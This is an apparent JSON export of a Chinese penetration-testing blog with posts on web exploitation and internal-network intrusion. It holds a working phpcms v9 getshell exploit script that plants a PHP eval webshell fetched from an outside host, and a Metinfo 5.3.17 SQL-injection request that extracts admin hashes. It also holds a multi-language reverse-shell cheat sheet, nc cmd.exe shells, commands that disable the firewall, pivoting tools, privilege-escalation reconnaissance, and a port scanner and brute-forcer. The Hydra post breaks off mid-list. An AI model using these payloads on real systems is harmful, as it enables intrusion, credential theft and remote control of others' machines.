[{"title":"phpcms v9前台getshell","url":"/2017/08/31/phpcms v9 前台getshell/","content":"\n# phpcms v9前台getshell\n\n\n在用户注册界面输入要注册的信息 \n然后通过Brup抓包 ，修改一下 Payload里面的账号 和邮箱 和昵称不能重复\nsrc那里修改自己的域名\n\nPayload:\n```\nsiteid=1&modelid=2&username=test&password=test123&pwdconfirm=test123&email=test%40qq.com&nickname=test233&dosubmit=%E5%90%8C%E6%84%8F%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C&protocol=&info[content]=<img src=http://phpcms.0day5.com/test.php#.jpg>\n```\n如果自己网站下解析php的话那么php内容应该是<?php echo '<?php eval($_POST[cmd]);?>';?> 否则下载后得到的文件内容是空白，copy访问远程文件也像IE一样，访问后取得解析后的内容。\n\n\n在Brup里面点击Go以后会爆出保存shell的路径\n，然后拿菜刀连接\n```\n<div style=\"font-size:12px;text-align:left; border:1px solid #9cc9e0; padding:1px 4px;color:#000000;font-family:Arial, Helvetica,sans-serif;\"><span><b>MySQL Query : </b> INSERT INTO `phpcms`.`v9_`(`content`,`userid`) VALUES ('&lt;img src=http://192.168.20.120:5000/uploadfile/2017/0831/20170831104425380.php&gt;','69') <br /><b> MySQL Error : </b>Table 'phpcms.v9_' doesn't exist <br /> <b>MySQL Errno : </b>1146 <br /><b> Message : </b> Table 'phpcms.v9_' doesn't exist <br /><a href='http://faq.phpcms.cn/?errno=1146&msg=Table+%27phpcms.v9_%27+doesn%27t+exist' target='_blank' style='color:red'>Need Help?</a></span></div>\n```\n详细链接：http://0day5.com/archives/4368/\n\n\n\nPython脚本 EXP：    \n\n\n\n```\n# -*- coding:utf-8 -*-\nimport requests\nimport sys\nfrom datetime import datetime\ndef getTime():\n    year = str(datetime.now().year)\n    month = \"%02d\" % datetime.now().month\n    day = \"%02d\" % datetime.now().day\n    hour = datetime.now().hour\n    hour = hour - 12 if hour > 12 else hour\n    hour = \"%02d\" % hour\n    minute = \"%02d\" % datetime.now().minute\n    second = \"%02d\" % datetime.now().second\n    microsecond = \"%06d\" % datetime.now().microsecond\n    microsecond = microsecond[:3]\n    nowTime = year + month + day + hour + minute + second + microsecond\n    return int(nowTime), year + \"/\" + month + day + \"/\"\ndef main():\n    if len(sys.argv) < 2:\n        print(\"[*]Usage   : Python 1.py http://xxx.com\")\n        sys.exit()\n    host = sys.argv[1]\n    url = host + \"/index.php?m=member&c=index&a=register&siteid=1\"\n    data = {\n        \"siteid\": \"1\",\n        \"modelid\": \"1\",\n        \"username\": \"adamin\",\n        \"password\": \"123456\",\n        \"email\": \"admian@qq.com\",\n        # 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0\n        \"info[content]\": \"<img src=http://file.codecat.one/normalOneWord.txt?.php#.jpg>\",\n        \"dosubmit\": \"1\",\n        \"protocol\": \"\",\n    }\n    try:\n        startTime, _ = getTime()\n        htmlContent = requests.post(url, data=data)\n        finishTime, dateUrl = getTime()\n        if \"MySQL Error\" in htmlContent.text and \"http\" in htmlContent.text:\n            successUrl = htmlContent.text[htmlContent.text.index(\"http\"):htmlContent.text.index(\".php\")] + \".php\"\n            print(\"[*]Shell  : %s\" % successUrl)\n        else:\n            print(\"[-]Notice : writing remoteShell successfully, but failing to get the echo. You can wait the program crawl the uploadfile(in 1-3 second)，or re-run the program after modifying value of username and email.\\n\")\n            successUrl = \"\"\n            for t in range(startTime, finishTime):\n                checkUrlHtml = requests.get(\n                    host + \"/uploadfile/\" + dateUrl + str(t) + \".php\")\n                if checkUrlHtml.status_code == 200:\n                    successUrl = host + \"/uploadfile/\" + \\\n                        dateUrl + str(t) + \".php\"\n                    print(\"[*]Shell  : %s\" % successUrl)\n                    break\n            if successUrl == \"\":\n                print(\n                    \"[x]Failed : had crawled all possible url, but i can't find out it. So it's failed.\\n\")\n    except:\n        print(\"Request Error\")\nif __name__ == '__main__':\n    main()\n```\n","tags":["Web"],"categories":["nw"]},{"title":"FPipe进行端口重定向使用方法","url":"/2017/08/30/FPipe端口转发使用/","content":"\n## FPipe进行端口重定向使用方法\n\n\n```\n攻击机器：192.168.20.122\n\nB肉鸡机器：192.168.20.129\n\nC3389机器：192.168.86.130\n```\n\n---\n\n- 过程：攻击机和肉鸡都在外网可以互通 并且攻击机已经拿到来B机器的webshell，C机器在内网可以和肉鸡互通，但不可以与攻击机互通。\n\n- 最终目的：攻击机连接上C机器的3389远程桌面\n\n\n---\n\n使用方法：\n\n    在已经拿到webshell的b肉鸡上执行：FPipe.exe -l 3214 -s 3215 -r 3389 192.168.86.130\n    \n    \n\n\n    意思是将发送到本机3215端口的连接通过3214端口被重定向到了C主机的3389端口上，然后再连接B的3214端口即可连接到C的3389上\n\n\n    然后使用mstsc连接 192.168.20.129:3214即可连接上C的远程桌面\n\n","tags":["fpipe"],"categories":["nw"]},{"title":"内网渗透所需要的端口转发和代理软件的使用","url":"/2017/08/30/内网渗透端口转发和代理软件/","content":"\n\n\n\n---\n\n\n\n\n\n# Windows\n\n## 正向代理\n\n```\n服务端      htran.exe -s -bind 8888\n客户端      SocksCap:SOCKS Version 5 服务端IP:8888\n```\n\n \n## 反向代理\n\n```\n客户端      htran.exe -s -listen 1234 8888\n服务端      htran.exe -s -connect 客户端IP 1234\n客户端      SocksCap:SOCKS Version 5 127.0.0.1:8888\n```\n\n \n## 正向端口转发\n\n```\n服务端      htran.exe -p -tran 8888 127.0.0.1 3389\n客户端      RDP 服务端IP:8888\n```\n\n## 反向端口转发\n\n```\n客户端      htran.exe -p -listen 1234 8888\n服务端      htran.exe -p -slave 客户端IP 1234 127.0.0.1 3389\n客户端      RDP 127.0.0.1:8888\n```\n\n \n \n## lcx\n\n```\n客户端      lcx.exe -listen 1234 8888\n服务端      lcx.exe -slave 客户端IP 1234 服务端IP 3389\n客户端      RDP 127.0.0.1:8888\n```\n\n \n \n \n## FPipe\n\n```\nfpipe -l 监听端口 -s 重定向源端口 -r 重定向目的端口 重定向目的IP\nfpipe.exe -l 80 -r 3389 127.0.0.1\n```\n\n \n \n \n## rinetd\n\n```\nrinetd.exe -c rinetd.conf\n         rinetd.conf\n0.0.0.0 1234 127.0.0.1 3389\n监听IP 监听端口 重定向目标IP 重定向目标端口\n```\n\n \n \n## httptunnel\n\n```\n客户端      htc -F 8888 服务端IP:80\n服务端      hts -F localhost:3389 80\n客户端      127.0.0.1:8888\n```\n\n \n \n \n## reDuh\n\n```\njava -jar reDuhClient.jar http://website/reDuh.aspx\n \nnc -vv localhost 1010\n[createTunnel]1234:127.0.0.1:3389\n \nRDP 127.0.0.1:1234\n \n\n```\n\n## 各种系统cmd关闭防火墙命令\n```\n\nWinxp / win 2003\n关闭/启动防火墙\nnetsh firewall set opmode DISABLE/ENABLE\n\n---------Win7/2008--------------\n关闭/启动防火墙\nnetsh advfirewall set allprofiles state off/on\n```\n\n\n\n\n```\n添加转发\nnetsh interface portproxy add v4tov4 转发端口 目标IP 目标端口\n或者\nnetsh interface portproxy add v4tov4 listenport=转发端口 listenaddress=本机IP connectport=目标端口 connectaddress=目标IP\n\n查看转发\nnetsh interface portproxy show all\n\n删除转发\nnetsh interface portproxy delete v4tov4 listenport=转发端口\n或者\nnetsh interface portproxy delete v4tov4 listenport=转发端口 listenaddress=本机IP\n```\n\n\n \n \n# Linux:\n\n## lcxForLinux\n```\n\n客户端      lcx.exe -listen 1234 8888\n服务端      ./lcx -slave 客户端IP 1234 服务端IP 22\n客户端      SSH 127.0.0.1:8888\n```\n\n \n \n## SSH Tunnel\n\n```\n服务端      ssh -C -f -N -g -R 1234:127.0.0.1:22 客户端用户名@客户端IP -p 22\n客户端      ssh 服务端用户名@127.0.0.1 -p 1234\n```\n\n \n## reDuh\n\n```\njava -jar reDuhClient.jar http://website/reDuh.php\n \nnc -vv localhost 1010\n[createTunnel]1234:127.0.0.1:22\n \nSSH 127.0.0.1:1234\n \n[killReDuh]\n```\n\n \n \n \n## rinetd\n\n```\n./rinetd -c rinetd.conf\n         rinetd.conf\n0.0.0.0 1234 127.0.0.1 22\n监听IP 监听端口 重定向目标IP 重定向目标端口\n```\n","tags":["SOCKS"],"categories":["nw"]},{"title":"Metinfo5.3.17前台SQL注入","url":"/2017/08/30/Metinfo5.3.17前台sql注入/","content":"\n\n\n## 漏洞介绍\n\nMetInfo于8月1日发布了5.3.18的升级公告，此次修复了5.X到5.3.17版本的SQL注入漏洞，影响范围广泛。\n\n### 触发漏洞前提条件\n\n网站开启伪静态功能\n\n## 漏洞危害\n\n成功攻击后攻击者可以获取到管理员账号还有hash值\n\n## 影响版本\n\nMetInfo 5.X - 5.3.17\n\n## 漏洞详解参考连接\nhttps://www.leavesongs.com/PENETRATION/metinfo-5.3.17-sql-injection.html\n\n\n---\n\n首先需要给index.php传一个lang=cn的值\n\nindex.php?lang=cn\n然后brup抓包添加 X-Rewrite-Url \n\n### Payload:\n\n```\nGET /metinfo/index.php?lang=Cn&index=0000 HTTP/1.1\nHost: 127.0.0.1\n\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0\nAccept: */*\nAccept-Language: en\nX-Rewrite-Url: 1/2/404xxx' union select 1,2,3,admin_pass,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 from met_admin_table limit 1#/index.php\nConnection: close\nUpgrade-Insecure-Requests: 1\n```\n#### User-agent，不能修改，如果修改会导致注入失败，其他按照Payload格式修改即可。\n\n","tags":["metinfo"],"categories":["Web渗透"]},{"title":"Sql注入笔记","url":"/2017/08/30/sql注入笔记/","content":"\n#sql注入笔记详细\n\n\n## 0x01 传参方式\n  ● 传参方式一般通过get方式，或者post方式提交，前者的优点是效率高，后者的优点是安全性好、参数的长度长。在sql注入攻击中，通常会选择用户输入内容的地方进行攻击。除此之外，http header中也存在sql注入，比如referer,cookie等等。所以思路一定要开阔，凡是输入数据库的内容都有可能是突破口。\n## 0x02 常用的mysql语句\n\n```\n（1）SELECT 列名称 FROM 表名称 WHERE 条件 #从表中选取数据\n     eg.:select username,password from users where id=input\n     \n（2）UPDATE 表名称 SET 列名称=新值 WHERE 其他列名称 = 某值 #修改表中某值\n     eg.:update users set password=’inputpass’ where username=’inputuser’\n     \n（3）insert into 表名称 values （值1，值2，…….） #向表格中插入新的行，其中values中插入的值可为逻辑运算的结果\n     eg.:insert into users values (’15’,’name’,’pass’)\n     \n```\n\n## 如下是注入常用操作：\n \n```\n     ● （1）注释符：# ， –+ ， //\n  \n  ● （2）联合查询：UNION\n  操作符用于合并两个或多个 SELECT 语句的结果集。\n  \n  ● （3）ORDER BY 语句用于对结果集进行排序,注入攻击中用于测试列的数量。\n  \n  ● （4）group_concat() 会计算哪些行属于同一组，将属于同一组的列显示出来。攻击时使用他的主要目的是将字段同时显示出来。\n  \n  ● （5）count() 统计元祖的个数。\n  \n  ● （6）rand() 用于产生一个0~1的随机数\n  \n  ● （7）floor() 向下取整。\n  \n  ● （8）group by 依据我们想要的规则，对结果进行分组（会对规则进行排序）。\n  \n  ● （9）outfile select from … where … into outfile ‘目标文件’ 将表的内容导出成为一个文本文件。\n  \n  ● （10）dumpfile select from … limit 0,1 where … into dumpfile ‘目标文件’ 将其中一行导出成文件，所以要加limit。\n  \n  ● （11）load_file select load_file(‘目标文件’) 载入上述文件。\n  \n  ● （12）length()返回字符串长度。\n  \n  ● （13）substr()截取字符串substr(字符串，位置，长度) substr(database(),1,1) 。\n  \n  ● （14）ascii()返回字符的ascii码 #通过>,<,=对字符的ascii进行缩小范围，从而确定字符。\n  \n  ● （15）sleep(n)程序挂起n秒。用于时间盲注。\n  \n  ● （16）if（a,b,c） 相同于a?b:c\n  \n```\n\n##  0x03 sql注入语句的构造\n\n```\n（1）SELECT 列名称 FROM 表名称 WHERE 条件\nselect username,password from users where id=inputselect username,password from users where id=’input’select username,password from users where id=”input”select username,password from users where id=(‘input’)\n```\n### I.联合查询的注入\n```\n1) 测试猜测语句，分别尝试输入：’ ” ‘) / \\ 测试是否报错\n\n2) 测试：1′ or ‘1’=’1\n插入语句后成为：\n    select username,password from users where id=’1′ or ‘1’=’1′\n完整闭合，语句可以正确执行或者使用注释符使其闭合\n测试：\n    1′ or 1=1#1′ or 1=1–+\n    \n3)  order by 语句测试列数\n1’order by 3#select username,password from users where id=’1’order by 3#’\n成功，则证明该语句没有错误，存在至少3列继续测试：1’order by 4#，发现出错，证明该表共存在3列。\n\n4)  union select 联合查询\n1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’ –+\n\nconcat() 爆出所有表名\n\n5)  爆用户名、密码\n1’union select 1,group_concat(username,password),3 from users–+#也可以在1，2，3处替换任意其他命令\n```\n## II.基于报错的注入\n```\n语句测试，当使用 1’union selcet 1,2,3 –+ 返回还是正常页面，因此我们要利用报错信息\n\n1′ and ( select 1 from (select count(),concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))name from information_schema.tables group by name)b)–+\n\n含义：取名concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))为name，count()name的个数，这时候会报错，从而爆出database()的值，’~’的用途在于方便识别。\n\n整个语句分析：整体相当于select 1 from b；\n其中b = select count(),concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))name from information_schema.tables group by name ，count()name的个数；\nname=concat(‘~’,’~’,database(),’~’,’~’,floor(rand()2))\n```\n\n## III.布尔盲注\n\n```\n1)  当出现无论输入任何语句页面只有两种情况的时候，即只存在正确页面和错误页面时，而不显示报错信息，这样我们就需要进行布尔盲注。通过猜测目标字符串字符的ascii码来确定字符，但该过程非常繁琐，自动化工具更方便一些。\n2)  语句构造：\n1’ and (ascii(substr(database(),1,1)))>100 –+\n返回正确页面说明该范围正确，返回错误页面相当于范围不正确，最后用等号确定。\n```\n\n## IV.基于时间的盲注\n\n```\n1)  这种情况下就是所有语句下页面只存在正确的一种，这样就用到了基于时间的盲注，原理是如果正确就执行sleep()函数，使程序挂起，这样我们就可以知道语句正确还是错误了。一般使用sleep(5)，使程序挂起5秒钟。\n\n2)  语句构造： 1′ and (select if (ascii(substr(database(),1,1))>100,sleep(5),NULL)) –+\n\nUPDATE 表名称 SET 列名称=新值 WHERE 其他列名称 = 某值 #修改表中某值\neg.:update users set password=’inputpass’ where username=’inputuser’\n\n```\n\n## 基于错误的sql注入\n\n```\n语句构造：  uname=admin&passwd=’ and (select 1 from (select count(*),(concat(“~”,database(),”~”,floor(rand()*2)))name from information_schema.tables group by name)b)#&submit=submit\n\ninsert into 表名称 values （值1，值2，…….） #向表格中插入新的行，其中values中插入的值可为逻辑运算的结果。\n\n这里我们的思路一定要开放，意识到注入点位置的广泛性。例如user-agent，http referer,都有可能存在注入点。\n\n基于错误的sql注入,语句构造： 1′,(select 1 from (select count(*),(concat(“~”,(select table_name from information_schema.tables where table_schema=database() limit 0,1),”~”,floor(rand()*2)))name from information_schema.tables group by name)b)\n```\n\n## 0x04 个人常用的基于错误的语句\n \n```\n1. (select 1 from (select count(*),(concat(“~”,(select table_name from information_schema.tables where table_schema=database() limit 0,1),”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆数据库*/\n\n2. (select 1 from (select count(*),(concat(“~”,current_user,”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆当前用户名*/\n\n3. (select 1 from (select count(*),(concat(“~”,(select username from users limit 0,1),”~”,floor(rand()*2)))name from information_schema.tables group by name)b) /*爆所有用户名*/\n\n附mysql中常见的系统函数及变量：\n  user() 用户名;\n  session_user()连接数据库的用户名;\n  database() 数据库名;\n  version() MYSQL数据库版本;\n  @@datadir 数据库路径;\n  current_user 当前用户名;\n  @@hostname 主机名;\n  @@port 数据库端口;\n  @@version_compile_os 操作系统;\n  basedir MYSQL安装路径\n```\n\n##    0x05 sqlmap使用\n \n```\nsqlmap作为一款强大的注入工具必不可少，它可以进行post注入(–data)，cookie注入(–cookie)，自定义注入级别(–leval)，自定义注入参数(-p)，自定义延时时间(–delay)，执行自定义python代码(–eval)，注入payload(–prefix ; –suffix)\n```\n\n```\n","tags":["sql"],"categories":["Web渗透"]},{"title":"python编写简单多线程指定端口扫描工具","url":"/2017/08/29/python编写简单端口扫描/","content":"#小菜鸟一只，大佬别喷，本程序是胡乱写的。\n```\n#!/usr/bin/env python\n#-*- coding:utf-8 -*-\nimport threading\nimport time\nimport socket\nimport sys\nimport datetime\n#多线程扫整个网段所有开启具体的端口，用来筛选专用的ip\nclass PortScans(threading.Thread):\n\n    def __init__(self,ip,port,ptype):\n        threading.Thread.__init__(self)\n        self.ip = ip\n        self.port = port\n        self.PortType = ptype\n    \n    def run(self):\n        socket.setdefaulttimeout(4)\n        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n        tm = time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime())  \n        try:\n            s.connect((self.ip,int(self.port)))\n            s.shutdown(2) \n            print \"[+]  \"+tm+\"   %15s    open   %3s       [ %s]     \\n\"%(self.ip,str(self.port),self.PortType)\n        except:\n            pass\n        \ndef VoteScan(ip,port,pt):\n    ps = PortScans(ip,port,pt)\n    ps.start()\ndef usage():\n    Logo  = '''\n     _____   _____   _____    _____   _____   _____       ___   __   _  \n    |  _  \\ /  _  \\ |  _  \\  |_   _| /  ___/ /  ___|     /   | |  \\ | | \n    | |_| | | | | | | |_| |    | |   | |___  | |        / /| | |   \\| | \n    |  ___/ | | | | |  _  /    | |   \\___  \\ | |       / / | | | |\\   | \n    | |     | |_| | | | \\ \\    | |    ___| | | |___   / /  | | | | \\  | \n    |_|     \\_____/ |_|  \\_\\   |_|   /_____/ \\_____| /_/   |_| |_|  \\_| \n\n    '''\n    print \"\\n\"\n    print Logo\n    print \"\\n\"\n    print \"             Usage: python PortScan.py 192.168.20.1               \"\n    print \"\\n\"\n    print \"             Author:r1b00t                       \"\n    print \"\\n\"\n    print u\"             用多线程扫整个网段开启的指定端口，用来筛选有针对性的ip          \"\n    print \"\\n\"\n\ndef main():\n    ip = sys.argv[1]\n    #port = sys.argv[2]\n    begin = datetime.datetime.now()\n    print \"------------------------------------------ Starting Scan Port ------------------------------------\"\n    print \"\\n\"\n    #ports1= ['21','22','23','1433','1521','3306','80','8000','8080','9000','8888','5432','6379','5984','7001','7002','22','22','22']\n\n    ports ={'ftp':'21','ssh':'22','telnet':'23','web':'80','mssql':'1433','Oracle':'1521','Mysql':'3306','PostgreSQL':'5432','SSL':'443','Rsync':'873','Redis':'6379','WebLogic':'7001','WebLogic1':'7002','RDP':'3389','tomcat':'8080','ElasticSearch':'9200','SAP':'50000 ','VNC':'5900',' Kloxo':'7778',\"Hadoop\":\"50070\",\"Hadoop1\":\"50030\"}\n    for sub in range(1,254):\n        \n        for keys,pvale in ports.items():\n            pv1 = int(pvale)\n            banner=ip.split(\".\")\n            banner[3]=sub\n            banner1 = str(banner[0])+\".\"+str(banner[1])+\".\"+str(banner[2])+\".\"+str(banner[3])\n            threading.Thread(target=VoteScan,args=(banner1,pv1,keys)).start()\n    end = datetime.datetime.now()\n    print u\"[+]程序运行了   \"+str((end-begin))+u\"  秒\"\n    \nif __name__ == '__main__':\n    if len(sys.argv) != 2:\n        usage()\n    else:\n        usage()\n        main()\n        print \"------------------------------------------ End Scan Port ------------------------------------\"\n```\n","tags":["多线程"],"categories":["python"]},{"title":"python编写简单zip爆破工具","url":"/2017/08/29/python编写简单zip爆破工具/","content":"\n\n\n\n```\n#!/usr/bin/env python\n#-*- coding:utf-8 -*-\nimport threading\nimport time\nimport zipfile\nimport sys\n\n\ndef ZipBrute(Zfile,pwd):\n    try :\n        Zfile.extractall(pwd = pwd)\n        #print u\"                   【经过CPU同志艰苦不屑的努力，终于把你的密码给弄到了！！！】\"\n        print u\"                【Password:     %s】\" %(pwd)\n    except:\n        return\ndef main():\n\n    zfile = zipfile.ZipFile(sys.argv[1])\n    passlist = [x.rstrip() for x in open(sys.argv[2])]\n    print \"+-----------------------------------------------------------------+\"\n    print u\"                Brute Thread is working!!\"\n    print u\"                【密码个数：    %s 】\"%(len(passlist))  \n    for pwds in passlist:\n        t = threading.Thread(target=ZipBrute,args=(zfile,pwds))\n        t.start()\n        t.join()\n    print \"+-----------------------------------------------------------------+\"\ndef Usage():\n    Logo = '''\n ______  _   _____   _____   _____    _   _   _____   _____  \n|___  / | | |  _  \\ |  _  \\ |  _  \\  | | | | |_   _| | ____| \n   / /  | | | |_| | | |_| | | |_| |  | | | |   | |   | |__   \n  / /   | | |  ___/ |  _  { |  _  /  | | | |   | |   |  __|  \n / /__  | | | |     | |_| | | | \\ \\  | |_| |   | |   | |___  \n/_____| |_| |_|     |_____/ |_|  \\_\\ \\_____/   |_|   |_____| \n    '''\n    print \"\\n\"\n    print Logo\n    print \"\\n\"\n    print \"             Usage: python zipbrute zip.zip    pwd.txt              \"\n    print \"\\n\"\n    print \"             Author:r1b00t                       \"\n    print \"\\n\"\n    print u\"             用多线程爆破zip文件          \"\n    print \"\\n\"\n\n\nif __name__ == '__main__':\n   if len(sys.argv) != 3:\n        Usage()\n   else:\n       Usage()\n       main()\n```\n","tags":["爆破"],"categories":["python"]},{"title":"linux下各种反弹shell","url":"/2017/08/29/linux下各种反弹shell/","content":"\n\n# Linux各种反弹shell\n\n## bash版本：\n\n\n```\nbash -i >& /dev/tcp/10.0.0.1/8080 0>&1\n使用解析shell的bash完成，所以某些情况下不支持\n```\nperl版本:\n\n```\nperl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n```\n\npython版本：\n\n\n```\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n```\n\nphp版本：\n\n\n```\nphp -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n```\n\nruby版本：\n\n   \n```\nruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\n```\n\nnc版本：\n\n\n```\nnc -e /bin/sh 10.0.0.1 1234\n\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f\n\nnc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999\n```\n\n\njava版本:\n\n```\nr = Runtime.getRuntime()\n\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\n\np.waitFor()\n```\n\nlua版本：\n\n```\nlua -e \"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');\"\n```\n\n\nnc不使用 -e参数\n\n```\nHacker:nc -lvnp listenport\n\nVictim:mknod /tmp/backpipe p\n\nVictim:/bin/sh 0</tmp/backpipe | nc attackerip listenport 1>/tmp/backpipe\n\n不使用nc\n\nMethod 1:\n\nHacker: nc -nvlpp 8080\n\nVictim: /bin/bash -i > /dev/tcp/173.214.173.151/8080 0<&1 2>&1\n\nMethod 2:\n\nHacker: nc -nvlpp8080\n\nVictim: mknod backpipe p && telnet 173.214.173.151 8080 0backpipe\n\nMethod 3:\n\nHacker: nc -nvlpp8080\n\nHacker: nc -nvlpp8888\n\nVictim: telnet 173.214.173.151 8080 | /bin/bash | telnet 173.214.173.151 8888\n```\n","tags":["nc"],"categories":["nw"]},{"title":"reduh+lcx+nc内网渗透笔记","url":"/2017/08/29/rudh+lcx+nc内网渗透笔记/","content":"\n```\n在我们进行内网渗透中,经常会遇到一些环境问\n题,比如拿下的目标机和自身的机器均处于内网之中,这时候想要对目标机内网进行渗透就会遇到一系列的问题.比如我如何用扫描器扫对方的内网?我没网IP如何远程登录对方内网主机。\n\n对于双内网环境,端口复用无疑是个很好的选择\n```\n\n## reDuh内网渗透使用：\n    \n\n```\nreDuh最开始是由SensePost在BlackHat USA2008会议上发表的一个议题中的一部分。它的出现是针对当前Web安全渗透测试经常会面临的一个问题，同时也是Web服务器加固方面一个很重要的部分， 那就是Web服务器对外只开放一个80端口\n。\n\nWeb服务器的安全防护可以是操作系统的端口定制或者是网管防火前的端口定制。这时渗透测试人员如果想进一步测试内网的话必须先拿下目标服务器并拥有一定的控制权限。reDuhGUI是由诺赛科技从原有的JAVA语言上移植到C++语言的一个WindowsGUI版本\n```\n\nreDuh 的文件下有专用的asp php jsp Webshell文件可以直接上传使用。\n\n1、当拿下web的权限后将，然后根据web的语言类型将server文件中的对应文件上传到服务器中，然后使用浏览器进行访问，看能否正常访问。\n如果正常访问界面会显示\"Unknown request to ReDuh\" 这句话\n\n2、然后打开ReDuh client 文件下的reDuhGUI.exe\n\n\n```\nurl：填写你的webshell地址 \n\nRemote Host：填写你要连接的远程主机\n\nLocal Port ： 填写你本地要监听的端口\n\nRemote Port : 填写远程的端口 如 3389、22\n\n填写好之后点击 \"start\"按钮  同时 ”create“ 按钮也变成激活样式 然后点击 \"create\" 添加一个转发规则\n\n然后就可以连接对方机器  \n    连接方式 ： 3389  \n        127.0.0.1:本地监听端口\n        \n        ssh 22\n        \n        xshell 连接：\n        \n             127.0.0.1：本地监听端口\n```\n\n\n\n\n## lcx 的使用 \n\n\n\n```\n内网机器上执行：lcx.exe –slave 公网IP +端口 内网IP +端口\n\n例如： lcx.exe –slave 192.168.43.142 51 192.168.43.137 3389\n    \n将内网(192.168.43.137)的3389端口转发到公网(192.168.43.142)的51端口\n\n然后在公网的机器上：\n\nLcx.exe –listen\n\n监听51端口，转发到公网机器的3389端口\n\n例如： Lcx.exe –listen 51 3389\n\n\n这个时候已经将内网的3389转发到了公网机器的3389端口，我们在本地机器上远程\n公网IP+3389 ，就连接上了内网机器的3389\n\n```\n\n## NC 反弹CMDshell\n\n\n\n```\n本机：192.168.43.142(win7) 远程机器：192.168.43.137(xp)\n\n\n正向连接：\n在远程机器上(t参数可以省略)\n\n肉鸡：nc -l -p 8888 -t -e cmd.exe\n\n\n攻击机：nc -nvv 肉鸡ip 8888\n\n\n\n反向连接：\n\n攻击机：nc -l -p 8888\n\n肉鸡： nc -t -e cmd.exe 攻击机Ip 攻击机本地监听端口\n\n\n```\n\n\n\n    \n","tags":["reduh"],"categories":["nw"]},{"title":"Windows内网渗透提权命令","url":"/2017/08/29/Windows内网渗透常用命令/","content":"\n\n    \n    \n#一、获取操作系统信息\n\n##识别操作系统名称及版本：\n\n    systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" \n    systeminfo | findstr /B /C:\"OS 名称\" /C:\"OS 版本\"\n##识别系统体系结构：\n\n    echo %PROCESSOR_ARCHITECTURE% \n    \n##查看所有环境变量：\n\n    SET\n\n#二、获取网络信息\n\n##查看路由表信息\n    \n        route print\n    \n##查看ARP缓存信息：\n\n        arp -A \n        \n##查看防火墙规则：\n    \n    netstat -ano\n    \n    netsh firewall show config \n    \n    netsh firewall show state\n\n#三、应用程序及服务\n    \n##查看计划任务：\n\n    schtasks /QUERY /fo LIST /v \n##中文系统的命令，先调整GBK编码为437美国编码：\n\n    chcp 437 \n    schtasks /QUERY /fo LIST /v\n\n##查看服务进程ID：\n\n    tasklist /SVC\n    \n##查看安装驱动：\n\n    DRIVERQUERY \n    \n##查看安装程序和版本信息（漏洞利用线索）：\n\n    wmic product list brief \n    \n##查看服务、进程和启动程序信息：\n\n    wmic service list brief \n    wmic process list brief\n    wmic startup list brief\n\n\n##查看.msi程序的执行权限：\n\n    reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n    \n    reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n\n##查看安装补丁和时间信息：\n\n    wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:\"KBxxxxxxx\"\n    \n","tags":["提权"],"categories":["nw"]},{"title":"Hydra使用","url":"/2017/08/29/Hydra/","content":"\n\n# Hydra 使用\n\n```\nhydra 选项\n      ○ -R\n      ○ 继续从上一次进度接着破解\n      ○ -S\n      ○ 大写，采用SSL链接\n      ○ -s <PORT>\n      ○ 小写，可通过这个参数指定非默认端口\n      ○ -l <LOGIN>\n      ○ 指定破解的用户，对特定用户破解\n      ○ -L <FILE>\n      ○ 指定用户名字典\n      ○ -p <PASS>\n      ○ 小写，指定密码破解，少用，一般是采用密码字典\n      ○ -P <FILE>\n      ○ 大写，指定密码字典\n      ○ -e <ns>\n      ○ 可选选项，n：空密码试探，s：使用指定用户和密码试探\n      ○ -C <FILE>\n      ○ 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数\n      ○ -M <FILE>\n      ○ 指定目标列表文件一行一条\n      ○ -o <FILE>\n      ○ 指定结果输出文件\n      ○ -f\n      ○ 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解\n      ○ -t <TASKS>\n      ○ 同时运行的线程数，默认为16\n      ○ -w <TIME>\n      ○ 设置最大超时的时间，单位秒，默认是30s\n      ○ -v / -V\n      ○ 显示详细过程\n      ○ server\n      ○ 目标ip\n      ○ service\n          ■ 指定服务名，支持的服务和协议：telnet ftp pop3[-ntlm] imap[-ntlm] smb smbnt http[s]-{head|get} http-{get|post}-form http-proxy 